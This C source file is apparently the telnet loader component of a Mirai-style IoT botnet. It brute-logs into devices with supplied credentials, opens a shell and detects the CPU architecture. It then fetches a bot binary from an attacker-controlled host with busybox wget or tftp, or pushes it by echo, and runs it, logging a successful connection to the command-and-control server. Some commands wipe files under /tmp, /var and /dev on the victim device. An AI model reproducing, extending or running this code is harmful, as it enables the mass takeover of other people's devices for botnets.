#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <string.h>
#include <sched.h>
#include <errno.h>

#include "headers/includes.h"
#include "headers/server.h"
#include "headers/telnet_info.h"
#include "headers/connection.h"
#include "headers/binary.h"
#include "headers/util.h"

extern FILE *debug_log;
extern FILE *success_log;
extern pthread_mutex_t log_mutex;

char *tmp_dirs[] = {"/tmp/", "/var/", "/dev/", "/mnt/", "/var/run/", "/var/tmp/", "/",
                    "/dev/netslink/", "/dev/shm/", "/bin/", "/etc/", "/boot/", "/usr/"};

struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip)
{
    struct server *srv = calloc(1, sizeof(struct server));
    struct server_worker *workers = calloc(threads, sizeof(struct server_worker));
    int i = 0;

    pthread_mutex_lock(&log_mutex);
    if (debug_log) {
        fprintf(debug_log, "Creating server with %d threads, max connections: %d\n", threads, max_open);
        fflush(debug_log);
    }
    pthread_mutex_unlock(&log_mutex);

    srv->bind_addrs_len = addr_len;
    srv->bind_addrs = addrs;
    srv->max_open = max_open;
    srv->wget_host_ip = wghip;
    srv->wget_host_port = wghp;
    srv->tftp_host_ip = thip;
    srv->estab_conns = calloc(max_open * 2, sizeof(struct connection *));
    srv->workers = calloc(threads, sizeof(struct server_worker));
    srv->workers_len = threads;

    if(srv->estab_conns == NULL)
    {
        pthread_mutex_lock(&log_mutex);
        if (debug_log) {
            fprintf(debug_log, "ERROR: Failed to allocate established connections array\n");
            fflush(debug_log);
        }
        pthread_mutex_unlock(&log_mutex);
        exit(0);
    }
    
    for(i = 0; i < max_open * 2; i++)
    {
        srv->estab_conns[i] = calloc(1, sizeof(struct connection));
        if(srv->estab_conns[i] == NULL)
        {
            pthread_mutex_lock(&log_mutex);
            if (debug_log) {
                fprintf(debug_log, "ERROR: Failed to allocate connection %d\n", i);
                fflush(debug_log);
            }
            pthread_mutex_unlock(&log_mutex);
            exit(-1);
        }
        pthread_mutex_init(&(srv->estab_conns[i]->lock), NULL);
    }

    for(i = 0; i < threads; i++)
    {
        struct server_worker *wrker = &srv->workers[i];

        wrker->srv = srv;
        wrker->thread_id = i;

        if((wrker->efd = epoll_create1(0)) == -1)
        {
            pthread_mutex_lock(&log_mutex);
            if (debug_log) {
                fprintf(debug_log, "ERROR: Failed to initialize epoll context for worker %d. Error code %d\n", i, errno);
                fflush(debug_log);
            }
            pthread_mutex_unlock(&log_mutex);
            free(srv->workers);
            free(srv);
            return NULL;
        }

        pthread_create(&wrker->thread, NULL, worker, wrker);
        
        pthread_mutex_lock(&log_mutex);
        if (debug_log) {
            fprintf(debug_log, "Created worker thread %d\n", i);
            fflush(debug_log);
        }
        pthread_mutex_unlock(&log_mutex);
    }

    pthread_create(&srv->to_thrd, NULL, timeout_thread, srv);

    pthread_mutex_lock(&log_mutex);
    if (debug_log) {
        fprintf(debug_log, "Server created successfully with %d workers\n", threads);
        fflush(debug_log);
    }
    pthread_mutex_unlock(&log_mutex);

    return srv;
}

void server_destroy(struct server *srv)
{
    if(srv == NULL)
        return;

    pthread_mutex_lock(&log_mutex);
    if (debug_log) {
        fprintf(debug_log, "Destroying server\n");
        fflush(debug_log);
    }
    pthread_mutex_unlock(&log_mutex);

    if(srv->bind_addrs != NULL)
        free(srv->bind_addrs);
    if(srv->workers != NULL)
        free(srv->workers);

    free(srv);
}

void server_queue_telnet(struct server *srv, struct telnet_info *info)
{
    // Reduced wait time for faster connection processing
    while(ATOMIC_GET(&srv->curr_open) >= srv->max_open)
    {
        usleep(10000); // 0.01 second instead of 1 second
    }

    ATOMIC_INC(&srv->curr_open);

    if(srv == NULL)
    {
        pthread_mutex_lock(&log_mutex);
        if (debug_log) {
            fprintf(debug_log, "ERROR: Server is NULL when queuing telnet\n");
            fflush(debug_log);
        }
        pthread_mutex_unlock(&log_mutex);
    }

    pthread_mutex_lock(&log_mutex);
    if (debug_log) {
        fprintf(debug_log, "Queuing telnet probe for %d.%d.%d.%d:%d\n", 
                info->addr & 0xff, (info->addr >> 8) & 0xff, (info->addr >> 16) & 0xff, (info->addr >> 24) & 0xff,
                ntohs(info->port));
        fflush(debug_log);
    }
    pthread_mutex_unlock(&log_mutex);

    server_telnet_probe(srv, info);
}

void server_telnet_probe(struct server *srv, struct telnet_info *info)
{
    int fd = util_socket_and_bind(srv);
    struct sockaddr_in addr;
    struct connection *conn;
    struct epoll_event event;
    int ret = 0;
    struct server_worker *wrker = &srv->workers[ATOMIC_INC(&srv->curr_worker_child) % srv->workers_len];

    if(fd == -1)
    {
        pthread_mutex_lock(&log_mutex);
        if (debug_log) {
            fprintf(debug_log, "ERROR: Failed to open and bind socket for %d.%d.%d.%d:%d\n", 
                    info->addr & 0xff, (info->addr >> 8) & 0xff, (info->addr >> 16) & 0xff, (info->addr >> 24) & 0xff,
                    ntohs(info->port));
            fflush(debug_log);
        }
        pthread_mutex_unlock(&log_mutex);
        ATOMIC_DEC(&srv->curr_open);
        return;
    }

    while(fd >= (srv->max_open * 2))
    {
        pthread_mutex_lock(&log_mutex);
        if (debug_log) {
            fprintf(debug_log, "ERROR: File descriptor %d too big for connection buffer\n", fd);
            fflush(debug_log);
        }
        pthread_mutex_unlock(&log_mutex);
        conn->fd = fd;
        connection_close(conn);
        return;
    }

    if(srv == NULL)
    {
        pthread_mutex_lock(&log_mutex);
        if (debug_log) {
            fprintf(debug_log, "ERROR: Server is NULL in telnet probe\n");
            fflush(debug_log);
        }
        pthread_mutex_unlock(&log_mutex);
    }

    memset(info->arch, 0, sizeof(info->arch));
    conn = srv->estab_conns[fd];
    memcpy(&conn->info, info, sizeof(struct telnet_info));
    conn->srv = srv;
    conn->fd = fd;
    connection_open(conn);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = info->addr;
    addr.sin_port = info->port;
    ret = connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in));
    if(ret == -1 && errno != EINPROGRESS)
    {
        pthread_mutex_lock(&log_mutex);
        if (debug_log) {
            fprintf(debug_log, "[FD%d] Connect error: %s\n", fd, strerror(errno));
            fflush(debug_log);
        }
        pthread_mutex_unlock(&log_mutex);
    }

    event.data.fd = fd;
    event.events = EPOLLOUT;
    epoll_ctl(wrker->efd, EPOLL_CTL_ADD, fd, &event);
    
    pthread_mutex_lock(&log_mutex);
    if (debug_log) {
        fprintf(debug_log, "[FD%d] Added to epoll for connection attempt\n", fd);
        fflush(debug_log);
    }
    pthread_mutex_unlock(&log_mutex);
}

static void bind_core(int core)
{
    pthread_t tid = pthread_self();
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(core, &cpuset);
    if(pthread_setaffinity_np(tid, sizeof(cpu_set_t), &cpuset) != 0)
    {
        pthread_mutex_lock(&log_mutex);
        if (debug_log) {
            fprintf(debug_log, "WARNING: Failed to bind worker to core %d\n", core);
            fflush(debug_log);
        }
        pthread_mutex_unlock(&log_mutex);
    }
    else
    {
        pthread_mutex_lock(&log_mutex);
        if (debug_log) {
            fprintf(debug_log, "Worker bound to core %d\n", core);
            fflush(debug_log);
        }
        pthread_mutex_unlock(&log_mutex);
    }
}

static void *worker(void *arg)
{
    struct server_worker *wrker = (struct server_worker *)arg;
    struct epoll_event events[128];

    bind_core(wrker->thread_id);

    pthread_mutex_lock(&log_mutex);
    if (debug_log) {
        fprintf(debug_log, "Worker thread %d started\n", wrker->thread_id);
        fflush(debug_log);
    }
    pthread_mutex_unlock(&log_mutex);

    while(TRUE)
    {
        int i, n = epoll_wait(wrker->efd, events, 127, -1);

        if(n == -1)
        {
            pthread_mutex_lock(&log_mutex);
            if (debug_log) {
                fprintf(debug_log, "Worker %d: epoll_wait error: %s\n", wrker->thread_id, strerror(errno));
                fflush(debug_log);
            }
            pthread_mutex_unlock(&log_mutex);
            perror("epoll_wait");
        }

        for(i = 0; i < n; i++)
            handle_event(wrker, &events[i]);
    }
}

static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
{
    int j = 0;
    struct connection *conn = wrker->srv->estab_conns[ev->data.fd];

    if(conn->fd == -1)
    {
        conn->fd = ev->data.fd;
        pthread_mutex_lock(&log_mutex);
        if (debug_log) {
            fprintf(debug_log, "[FD%d] Connection FD mismatch, closing\n", ev->data.fd);
            fflush(debug_log);
        }
        pthread_mutex_unlock(&log_mutex);
        connection_close(conn);
        return;
    }

    if(conn->fd != ev->data.fd)
    {
        pthread_mutex_lock(&log_mutex);
        if (debug_log) {
            fprintf(debug_log, "[FD%d] Socket mismatch: conn->fd=%d, ev->data.fd=%d\n", 
                    ev->data.fd, conn->fd, ev->data.fd);
            fflush(debug_log);
        }
        pthread_mutex_unlock(&log_mutex);
    }

    if(ev->events & EPOLLERR || ev->events & EPOLLHUP || ev->events & EPOLLRDHUP)
    {
        pthread_mutex_lock(&log_mutex);
        if (debug_log) {
            fprintf(debug_log, "[FD%d] Connection error/hangup detected, closing\n", ev->data.fd);
            fflush(debug_log);
        }
        pthread_mutex_unlock(&log_mutex);
        connection_close(conn);
        return;
    }

    if(conn->state_telnet == TELNET_CONNECTING && ev->events & EPOLLOUT)
    {
        struct epoll_event event;

        int so_error = 0;
        socklen_t len = sizeof(so_error);
        getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &so_error, &len);
        if(so_error)
        {
            pthread_mutex_lock(&log_mutex);
            if (debug_log) {
                fprintf(debug_log, "[FD%d] Connection refused: %s\n", ev->data.fd, strerror(so_error));
                fflush(debug_log);
            }
            pthread_mutex_unlock(&log_mutex);
            connection_close(conn);
            return;
        }

        pthread_mutex_lock(&log_mutex);
        if (debug_log) {
            fprintf(debug_log, "[FD%d] Connection established successfully\n", ev->data.fd);
            fflush(debug_log);
        }
        pthread_mutex_unlock(&log_mutex);

        event.data.fd = conn->fd;
        event.events = EPOLLIN | EPOLLET;
        epoll_ctl(wrker->efd, EPOLL_CTL_MOD, conn->fd, &event);
        conn->state_telnet = TELNET_READ_IACS;
        conn->timeout = 45;
    }

    if(!conn->open)
    {
        pthread_mutex_lock(&log_mutex);
        if (debug_log) {
            fprintf(debug_log, "[FD%d] Socket not open! events: %08x, state: %d\n", 
                    ev->data.fd, ev->events, conn->state_telnet);
            fflush(debug_log);
        }
        pthread_mutex_unlock(&log_mutex);
    }

    if(ev->events & EPOLLIN && conn->open)
    {
        int ret = 0;
        conn->last_recv = time(NULL);
        while(TRUE)
        {
            ret = recv(conn->fd, conn->rdbuf + conn->rdbuf_pos, sizeof(conn->rdbuf) - conn->rdbuf_pos, MSG_NOSIGNAL);
            if(ret <= 0)
            {
                if(errno != EAGAIN && errno != EWOULDBLOCK)
                {
                    pthread_mutex_lock(&log_mutex);
                    if (debug_log) {
                        fprintf(debug_log, "[FD%d] Recv error %d: %s\n", ev->data.fd, errno, strerror(errno));
                        fflush(debug_log);
                    }
                    pthread_mutex_unlock(&log_mutex);
                    connection_close(conn);
                }
                break;
            }
            conn->rdbuf_pos += ret;
            conn->last_recv = time(NULL);

            if(conn->rdbuf_pos > 8196)
            {
                pthread_mutex_lock(&log_mutex);
                if (debug_log) {
                    fprintf(debug_log, "[FD%d] Buffer overflow detected, aborting\n", ev->data.fd);
                    fflush(debug_log);
                }
                pthread_mutex_unlock(&log_mutex);
                abort();
            }

            while(TRUE)
            {
                int consumed = 0;

                switch(conn->state_telnet)
                {
                    case TELNET_READ_IACS:
                        consumed = connection_consume_iacs(conn);
                        if(consumed)
                        {
                            conn->state_telnet = TELNET_USER_PROMPT;
                            pthread_mutex_lock(&log_mutex);
                            if (debug_log) {
                                fprintf(debug_log, "[FD%d] State: IACS -> USER_PROMPT\n", conn->fd);
                                fflush(debug_log);
                            }
                            pthread_mutex_unlock(&log_mutex);
                        }
                        break;
                    case TELNET_USER_PROMPT:
                        consumed = connection_consume_login_prompt(conn);
                        if(consumed)
                        {
                            util_sockprintf(conn->fd, "%s", conn->info.user);
                            strcpy(conn->output_buffer.data, "\r\n");
                            conn->output_buffer.deadline = time(NULL) + 1;
                            conn->state_telnet = TELNET_PASS_PROMPT;
                            pthread_mutex_lock(&log_mutex);
                            if (debug_log) {
                                fprintf(debug_log, "[FD%d] State: USER_PROMPT -> PASS_PROMPT, sent username: %s\n", 
                                        conn->fd, conn->info.user);
                                fflush(debug_log);
                            }
                            pthread_mutex_unlock(&log_mutex);
                        }
                        break;
                    case TELNET_PASS_PROMPT:
                        consumed = connection_consume_password_prompt(conn);
                        if(consumed)
                        {
                            util_sockprintf(conn->fd, "%s", conn->info.pass);
                            strcpy(conn->output_buffer.data, "\r\n\r\n");
                            conn->output_buffer.deadline = time(NULL) + 1;
                            conn->state_telnet = TELNET_WAITPASS_PROMPT;
                            pthread_mutex_lock(&log_mutex);
                            if (debug_log) {
                                fprintf(debug_log, "[FD%d] State: PASS_PROMPT -> WAITPASS_PROMPT, sent password\n", conn->fd);
                                fflush(debug_log);
                            }
                            pthread_mutex_unlock(&log_mutex);
                        }
                        break;
                    case TELNET_WAITPASS_PROMPT:
                        if((consumed = connection_consume_prompt(conn)) > 0)
                        {
                            util_sockprintf(conn->fd, "enable\r\n");
                            util_sockprintf(conn->fd, "system\r\n");
                            util_sockprintf(conn->fd, "shell\r\n");
                            util_sockprintf(conn->fd, "sh\r\n");
                            ATOMIC_INC(&wrker->srv->total_logins);
                            conn->state_telnet = TELNET_READ_WRITEABLE;
                            pthread_mutex_lock(&log_mutex);
                            if (debug_log) {
                                fprintf(debug_log, "[FD%d] State: WAITPASS_PROMPT -> READ_WRITEABLE, login successful\n", conn->fd);
                                fflush(debug_log);
                            }
                            pthread_mutex_unlock(&log_mutex);
                        }
                        break;
                    case TELNET_READ_WRITEABLE:
                        for(j = 0; j < 13; j++)
                            util_sockprintf(conn->fd, ">%s.ptmx && cd %s\r\n", tmp_dirs[j], tmp_dirs[j]);
                        util_sockprintf(conn->fd, "/bin/busybox rm -rf %s %s\r\n", FN_BINARY, FN_DROPPER);
                        util_sockprintf(conn->fd, "/bin/busybox cp /bin/busybox " FN_BINARY "; >" FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n");
                        conn->state_telnet = TELNET_COPY_ECHO;
                        conn->timeout = 120;
                        pthread_mutex_lock(&log_mutex);
                        if (debug_log) {
                            fprintf(debug_log, "[FD%d] State: READ_WRITEABLE -> COPY_ECHO, setting up environment\n", conn->fd);
                            fflush(debug_log);
                        }
                        pthread_mutex_unlock(&log_mutex);
                        break;
                    case TELNET_COPY_ECHO:
                        consumed = connection_consume_copy_op(conn);
                        if(consumed)
                        {
                            pthread_mutex_lock(&log_mutex);
                            if (debug_log) {
                                fprintf(debug_log, "[FD%d] State: COPY_ECHO completed, checking architecture\n", conn->fd);
                                fflush(debug_log);
                            }
                            pthread_mutex_unlock(&log_mutex);
                            if(!conn->info.has_arch)
                            {
                                conn->state_telnet = TELNET_DETECT_ARCH;
                                conn->timeout = 200;
                                util_sockprintf(conn->fd, "/bin/busybox cat /bin/busybox || while read i; do echo $i; done < /bin/busybox\r\n");
                                util_sockprintf(conn->fd, TOKEN_QUERY "\r\n");
                            }
                            else
                            {
                                conn->state_telnet = TELNET_UPLOAD_METHODS;
                                conn->timeout = 45;
                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                            }
                        }
                        break;
                    case TELNET_DETECT_ARCH:
                        consumed = connection_consume_arch(conn);
                        if(consumed)
                        {
                            conn->timeout = 45;
                            if((conn->bin = binary_get_by_arch(conn->info.arch, strlen(conn->info.arch))) == NULL)
                            {
                                pthread_mutex_lock(&log_mutex);
                                if (debug_log) {
                                    fprintf(debug_log, "[FD%d] Cannot determine architecture %s, closing\n", conn->fd, conn->info.arch);
                                    fflush(debug_log);
                                }
                                pthread_mutex_unlock(&log_mutex);
                                connection_close(conn);
                            }
                            else if(strcmp(conn->info.arch, "arm") == 0)
                            {
                                pthread_mutex_lock(&log_mutex);
                                if (debug_log) {
                                    fprintf(debug_log, "[FD%d] ARM architecture detected, determining subtype\n", conn->fd);
                                    fflush(debug_log);
                                }
                                pthread_mutex_unlock(&log_mutex);
                                util_sockprintf(conn->fd, "/bin/busybox cat /proc/cpuinfo || while read i; do echo $i; done < /proc/cpuinfo; " TOKEN_QUERY "\r\n");
                                conn->state_telnet = TELNET_ARM_SUBTYPE;
                            }
                            else
                            {
                                pthread_mutex_lock(&log_mutex);
                                if (debug_log) {
                                    fprintf(debug_log, "[FD%d] Detected architecture: '%s'\n", conn->fd, conn->info.arch);
                                    fflush(debug_log);
                                }
                                pthread_mutex_unlock(&log_mutex);
                                util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                                conn->state_telnet = TELNET_UPLOAD_METHODS;
                            }
                        }
                        break;
                    case TELNET_ARM_SUBTYPE:
                        if((consumed = connection_consume_arm_subtype(conn)) > 0)
                        {
                            struct binary *bin = binary_get_by_arch(conn->info.arch, strlen(conn->info.arch));

                            if(bin == NULL)
                            {
                                pthread_mutex_lock(&log_mutex);
                                if (debug_log) {
                                    fprintf(debug_log, "[FD%d] No ARMv7 binary available, using default ARM\n", conn->fd);
                                    fflush(debug_log);
                                }
                                pthread_mutex_unlock(&log_mutex);
                            }
                            else
                                conn->bin = bin;

                            util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                            conn->state_telnet = TELNET_UPLOAD_METHODS;
                        }
                        break;
                    case TELNET_UPLOAD_METHODS:
                        consumed = connection_consume_upload_methods(conn);
                        if(consumed)
                        {
                            char method_str[32];
                            switch(conn->info.upload_method) {
                                case 0: strcpy(method_str, "ECHO"); break;
                                case 1: strcpy(method_str, "WGET"); break;
                                case 2: strcpy(method_str, "TFTP"); break;
                                default: strcpy(method_str, "UNKNOWN"); break;
                            }
                            
                            pthread_mutex_lock(&log_mutex);
                            if (debug_log) {
                                fprintf(debug_log, "[FD%d] Selected upload method: %s\n", conn->fd, method_str);
                                fflush(debug_log);
                            }
                            pthread_mutex_unlock(&log_mutex);
                            
                            switch(conn->info.upload_method)
                            {
                                case UPLOAD_ECHO:
                                    conn->state_telnet = TELNET_UPLOAD_ECHO;
                                    conn->timeout = 45;
                                    util_sockprintf(conn->fd, "/bin/busybox cp " FN_BINARY " " FN_DROPPER "; >" FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
                                    break;
                                case UPLOAD_WGET:
                                    conn->state_telnet = TELNET_UPLOAD_WGET;
                                    conn->timeout = 120;
                                    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/%s.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    wrker->srv->wget_host_ip, wrker->srv->wget_host_port, "static", conn->info.arch);
                                    break;
                                case UPLOAD_TFTP:
                                    conn->state_telnet = TELNET_UPLOAD_TFTP;
                                    conn->timeout = 120;
                                    util_sockprintf(conn->fd, "/bin/busybox tftp -g -l %s -r %s.%s %s; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                    FN_BINARY, "static", conn->info.arch, wrker->srv->tftp_host_ip);
                                    break;
                            }
                        }
                        break;
                    case TELNET_UPLOAD_ECHO:
                        consumed = connection_upload_echo(conn);
                        if(consumed)
                        {
                            conn->state_telnet = TELNET_RUN_BINARY;
                            conn->timeout = 45;
                            if(strncmp(conn->info.arch, "arc", 3) == 0)
                                util_sockprintf(conn->fd, "./%s %s.echo; " EXEC_QUERY "\r\n", FN_DROPPER, conn->info.arch);
                            else
                                util_sockprintf(conn->fd, "./%s > %s; ./%s %s.echo; " EXEC_QUERY "\r\n", FN_DROPPER, FN_BINARY, FN_BINARY, id_tag);
                            ATOMIC_INC(&wrker->srv->total_echoes);
                            pthread_mutex_lock(&log_mutex);
                            if (debug_log) {
                                fprintf(debug_log, "[FD%d] State: UPLOAD_ECHO -> RUN_BINARY\n", conn->fd);
                                fflush(debug_log);
                            }
                            pthread_mutex_unlock(&log_mutex);
                        }
                        break;
                    case TELNET_UPLOAD_WGET:
                        consumed = connection_upload_wget(conn);
                        if(consumed > 0)
                        {
                            conn->state_telnet = TELNET_RUN_BINARY;
                            conn->timeout = 45;
                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.wget; " EXEC_QUERY "\r\n", id_tag);
                            ATOMIC_INC(&wrker->srv->total_wgets);
                            pthread_mutex_lock(&log_mutex);
                            if (debug_log) {
                                fprintf(debug_log, "[FD%d] State: UPLOAD_WGET -> RUN_BINARY\n", conn->fd);
                                fflush(debug_log);
                            }
                            pthread_mutex_unlock(&log_mutex);
                        }
                        else if(consumed < -1)
                        {
                            consumed *= -1;
                            conn->state_telnet = TELNET_UPLOAD_ECHO;
                            conn->info.upload_method = UPLOAD_ECHO;
                            conn->timeout = 45;
                            if(conn->clear_up == 1)
                            {
                                util_sockprintf(conn->fd, "/bin/busybox rm -f /tmp/* /var/* /dev/*\r\n");
                                util_sockprintf(conn->fd, "/bin/busybox cp " FN_BINARY " " FN_DROPPER "; >" FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
                            }
                            else
                                util_sockprintf(conn->fd, "/bin/busybox cp " FN_BINARY " " FN_DROPPER "; >" FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
                            pthread_mutex_lock(&log_mutex);
                            if (debug_log) {
                                fprintf(debug_log, "[FD%d] WGET failed, falling back to ECHO\n", conn->fd);
                                fflush(debug_log);
                            }
                            pthread_mutex_unlock(&log_mutex);
                        }
                        break;
                    case TELNET_UPLOAD_TFTP:
                        consumed = connection_upload_tftp(conn);
                        if(consumed > 0)
                        {
                            conn->state_telnet = TELNET_RUN_BINARY;
                            conn->timeout = 45;
                            util_sockprintf(conn->fd, "./" FN_BINARY " %s.tftp; " EXEC_QUERY "\r\n", id_tag);
                            ATOMIC_INC(&wrker->srv->total_tftps);
                            pthread_mutex_lock(&log_mutex);
                            if (debug_log) {
                                fprintf(debug_log, "[FD%d] State: UPLOAD_TFTP -> RUN_BINARY\n", conn->fd);
                                fflush(debug_log);
                            }
                            pthread_mutex_unlock(&log_mutex);
                        }
                        else if(consumed < -1)
                        {
                            consumed *= -1;
                            conn->state_telnet = TELNET_UPLOAD_ECHO;
                            conn->info.upload_method = UPLOAD_ECHO;
                            conn->timeout = 45;
                            if(conn->clear_up == 1)
                            {
                                util_sockprintf(conn->fd, "/bin/busybox rm -f /tmp/* /var/* /dev/*\r\n");
                                util_sockprintf(conn->fd, "/bin/busybox cp " FN_BINARY " " FN_DROPPER "; >" FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
                            }
                            else
                                util_sockprintf(conn->fd, "/bin/busybox cp " FN_BINARY " " FN_DROPPER "; >" FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
                            pthread_mutex_lock(&log_mutex);
                            if (debug_log) {
                                fprintf(debug_log, "[FD%d] TFTP failed, falling back to ECHO\n", conn->fd);
                                fflush(debug_log);
                            }
                            pthread_mutex_unlock(&log_mutex);
                        }
                        break;
                    case TELNET_RUN_BINARY:
                        if((consumed = connection_verify_payload(conn)) > 0)
                        {
                            if(consumed >= 255)
                            {
                                conn->success = TRUE;
                                pthread_mutex_lock(&log_mutex);
                                if (debug_log) {
                                    fprintf(debug_log, "[FD%d] SUCCESSFUL PAYLOAD EXECUTION - Connected to CNC\n", conn->fd);
                                    fflush(debug_log);
                                }
                                pthread_mutex_unlock(&log_mutex);
                                consumed -= 255;
                            }
                            else
                            {
                                pthread_mutex_lock(&log_mutex);
                                if (debug_log) {
                                    fprintf(debug_log, "[FD%d] Payload execution failed - no CNC connection\n", conn->fd);
                                    fflush(debug_log);
                                }
                                pthread_mutex_unlock(&log_mutex);
                                if(conn->info.upload_method == UPLOAD_ECHO && conn->echo_retries != 1)
                                {
                                    pthread_mutex_lock(&log_mutex);
                                    if (debug_log) {
                                        fprintf(debug_log, "[FD%d] Echo failed, retrying with different method\n", conn->fd);
                                        fflush(debug_log);
                                    }
                                    pthread_mutex_unlock(&log_mutex);
                                    conn->echo_load_pos = 0;
                                    conn->use_slash_c = 1;
                                    conn->echo_retries = 1;
                                    conn->state_telnet = TELNET_UPLOAD_ECHO;
                                    conn->timeout = 45;
                                    util_sockprintf(conn->fd, "/bin/busybox rm -rf %s %s\r\n", FN_DROPPER, FN_BINARY);
                                    util_sockprintf(conn->fd, "/bin/busybox cp /bin/busybox " FN_DROPPER "; >" FN_DROPPER "; /bin/busybox chmod 777 " FN_DROPPER "; " TOKEN_QUERY "\r\n");
                                    util_sockprintf(conn->fd, "/bin/busybox cp /bin/busybox " FN_BINARY "; >" FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY"; " TOKEN_QUERY "\r\n");
                                    break;
                                }
                                else
                                {
                                    if(!conn->retry_bin && strncmp(conn->info.arch, "arm", 3) == 0)
                                    {
                                        pthread_mutex_lock(&log_mutex);
                                        if (debug_log) {
                                            fprintf(debug_log, "[FD%d] Retrying with different ARM binary\n", conn->fd);
                                            fflush(debug_log);
                                        }
                                        pthread_mutex_unlock(&log_mutex);
                                        conn->echo_load_pos = 0;
                                        conn->use_slash_c = 0;
                                        conn->echo_retries = 0;
                                        conn->clear_up = 0;
                                        strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
                                        conn->bin = binary_get_by_arch(conn->info.arch, strlen(conn->info.arch));
                                        util_sockprintf(conn->fd, "/bin/busybox rm -rf %s %s\r\n", FN_DROPPER, FN_BINARY);
                                        util_sockprintf(conn->fd, "/bin/busybox cp /bin/busybox " FN_BINARY "; >" FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n");
                                        util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                                        conn->state_telnet = TELNET_UPLOAD_METHODS;
                                        conn->retry_bin = TRUE;
                                        break;
                                    }
                                }
                            }

                            util_sockprintf(conn->fd, "/bin/busybox rm -rf %s; >" FN_BINARY "; " TOKEN_QUERY "\r\n", FN_DROPPER);
                            conn->state_telnet = TELNET_CLEANUP;
                            conn->timeout = 45;
                        }
                        break;
                    case TELNET_CLEANUP:
                        if((consumed = connection_consume_cleanup(conn)) > 0)
                        {
                            int tfd = conn->fd;
                            connection_close(conn);
                            pthread_mutex_lock(&log_mutex);
                            if (debug_log) {
                                fprintf(debug_log, "[FD%d] Cleanup completed, connection closed\n", tfd);
                                fflush(debug_log);
                            }
                            pthread_mutex_unlock(&log_mutex);
                        }
                    default:
                        consumed = 0;
                        break;
                }

                if(consumed == 0)
                    break;
                else
                {
                    if(consumed > conn->rdbuf_pos)
                    {
                        consumed = conn->rdbuf_pos;
                    }
                    conn->rdbuf_pos -= consumed;
                    memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                    conn->rdbuf[conn->rdbuf_pos] = 0;
                }

                if(conn->rdbuf_pos > 8196)
                {
                    pthread_mutex_lock(&log_mutex);
                    if (debug_log) {
                        fprintf(debug_log, "[FD%d] Buffer overflow in processing loop, aborting\n", conn->fd);
                        fflush(debug_log);
                    }
                    pthread_mutex_unlock(&log_mutex);
                    abort();
                }
            }
        }
    }
}

static void *timeout_thread(void *arg)
{
    struct server *srv = (struct server *)arg;
    int i = 0, ct = 0;

    pthread_mutex_lock(&log_mutex);
    if (debug_log) {
        fprintf(debug_log, "Timeout thread started\n");
        fflush(debug_log);
    }
    pthread_mutex_unlock(&log_mutex);

    while(TRUE)
    {
        ct = time(NULL);
        
        for(i = 0; i < (srv->max_open * 2); i++)
        {
            struct connection *conn = srv->estab_conns[i];

            if(conn->open && conn->last_recv > 0 && ct - conn->last_recv > conn->timeout)
            {
                pthread_mutex_lock(&log_mutex);
                if (debug_log) {
                    fprintf(debug_log, "[FD%d] Connection timed out after %d seconds\n", conn->fd, conn->timeout);
                    fflush(debug_log);
                }
                pthread_mutex_unlock(&log_mutex);
                
                if(conn->state_telnet == TELNET_RUN_BINARY && !conn->ctrlc_retry && strncmp(conn->info.arch, "arm", 3) == 0)
                {
                    conn->last_recv = time(NULL);
                    util_sockprintf(conn->fd, "\x03\x1Akill %%1\r\n/bin/busybox rm -rf " FN_BINARY " " FN_DROPPER "\r\n");
                    conn->ctrlc_retry = TRUE;
                    conn->echo_load_pos = 0;
                    conn->use_slash_c = 0;
                    conn->echo_retries = 0;
                    conn->clear_up = 0;
                    strcpy(conn->info.arch, (conn->info.arch[3] == '\0' ? "arm7" : "arm"));
                    conn->bin = binary_get_by_arch(conn->info.arch, strlen(conn->info.arch));
                    util_sockprintf(conn->fd, "/bin/busybox wget; /bin/busybox tftp; " TOKEN_QUERY "\r\n");
                    conn->state_telnet = TELNET_UPLOAD_METHODS;
                    conn->retry_bin = TRUE;
                    
                    pthread_mutex_lock(&log_mutex);
                    if (debug_log) {
                        fprintf(debug_log, "[FD%d] ARM timeout retry initiated\n", conn->fd);
                        fflush(debug_log);
                    }
                    pthread_mutex_unlock(&log_mutex);
                }
                else
                {
                    connection_close(conn);
                }
            }
            else if(conn->open && conn->output_buffer.deadline != 0 && time(NULL) > conn->output_buffer.deadline)
            {
                conn->output_buffer.deadline = 0;
                util_sockprintf(conn->fd, conn->output_buffer.data);
            }
        }

        sleep(1);
    }
}
